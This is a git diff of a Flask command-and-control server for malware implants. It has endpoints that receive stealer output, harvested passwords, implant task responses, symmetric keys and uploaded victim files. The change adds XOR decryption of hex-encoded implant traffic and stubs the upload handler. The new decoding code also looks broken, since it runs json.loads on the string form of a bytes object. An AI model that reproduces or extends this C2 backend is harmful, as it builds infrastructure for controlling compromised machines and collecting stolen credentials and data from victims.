@@ -16,6 +16,7 @@ from flask_jwt_extended import (JWTManager, create_access_token, get_jwt,
 from psycopg2 import connect, sql
 import WyattWonderland
 import RsaDecryption
+import xor
 
 app = Flask(__name__)
 CORS(app)
@@ -216,7 +217,7 @@ def handle_response_stealer():
         print("After calling wyatts wonderland")
         task_id = data['task_id']
         target_implant_id = data['target_implant_id'] 
-        tools.updateLastSeen(target_implant_id)
+        # tools.updateLastSeen(target_implant_id)
         success = data['success']
         if success in ['Success', 'success']:
             success = True
@@ -267,12 +268,6 @@ def handle_passwords():
         return e, 400, {'Access-Control-Allow-Origin': config.clientURL}
 
 
-# Implant response endpoint, in json
-# Implant response endpoint, in json
-
-# Addisons Worktime -
-# Attempting to add encryption
-
     
 ## Route for implant to post new symkey
 @app.route("/new_symkey", methods=["POST"])
@@ -290,6 +285,7 @@ def new_symkey():
         print(data)
         print(str(data))
         print(jsonify(data))
+        
         """
         target_implant_id = data['target_implant_id']
         task_id = data['task_id']
@@ -328,8 +324,24 @@ else:
 def handle_response_json():
     print("Recieved response")
     try:
-        data = request.get_json(force=True)
-        print()
+        if (request.content_length >= 4000):
+            return "nuar", 405, {'Access-Control-Allow-Origin': '*'}
+            
+        data = request.get_data()
+        # print(data)
+        # print(len(data))
+        datastr = data.decode("utf-8")
+        databytes = bytes.fromhex(datastr)
+        
+        data = xor.xorcrypt(databytes, xor.symkey)
+        print("Data bytes: ")
+        print(data)
+        # data = request.get_json(force=True)
+        print("Data string: ")
+        data = str(data)
+        print("Data jsonify")
+        data = json.loads(data)
+
         print("response:")
         target_implant_id = data['target_implant_id']
         tools.updateLastSeen(target_implant_id)
@@ -398,9 +410,13 @@ def get_history():
 
 @app.route("/upload_files", methods=["POST"])
 def upload_files():
+    print("Recieved upload_file")
     try:
-        file = request.files 
-        print("recieved upload_files: \n Response: ")
+        print(request.headers.get('id'))
+        file = request.files
         print(file)
+        print("recieved upload_files: \n Response: ")
+        return "success", 200, {'Access-Control-Allow-Origin': '*'}
+
     except Exception as e:
         return e, {'Access-Control-Allow-Origin': '*'}
